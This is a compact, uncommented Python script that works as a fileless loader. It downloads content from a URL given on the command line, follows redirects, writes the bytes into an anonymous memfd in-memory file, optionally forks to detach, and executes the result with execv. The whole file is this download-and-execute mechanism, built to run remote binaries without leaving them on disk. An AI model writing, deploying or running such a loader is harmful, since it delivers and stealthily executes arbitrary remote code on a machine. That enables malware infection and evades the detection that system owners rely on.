from ctypes import CDLL
from os import execv, fork, environ
from http import client as c
from sys import argv, exit as e
from urllib.parse import urlparse


def get(s, h, p, l):
    cl = c.HTTPSConnection(h, int(p)) if s == "https" else c.HTTPConnection(h, int(p))
    cl.request("GET", l)
    return cl.getresponse()

def fne(url: str, ps: list[str]):
    pos = {"http": 80, "https": 443}
    pu = urlparse(url)
    c, l, r = (lambda r: (r.code, r.getheader("Location"), r.read()))(get(pu.scheme, *(pu.netloc.split(":", 1) if ":" in pu.netloc else (pu.netloc,pos[pu.scheme])),pu.path+"?"+pu.query))
    if c in range(300, 400): fne(l, ps)
    p = "/proc/self/fd/" + str(CDLL('libc.so.6').memfd_create('a', 0))
    with open(p, "wb+") as m: m.write(r)
    if environ.get("FORK") and fork(): e()
    execv(p, [p] + ps)

fne(argv[1], argv[2:])
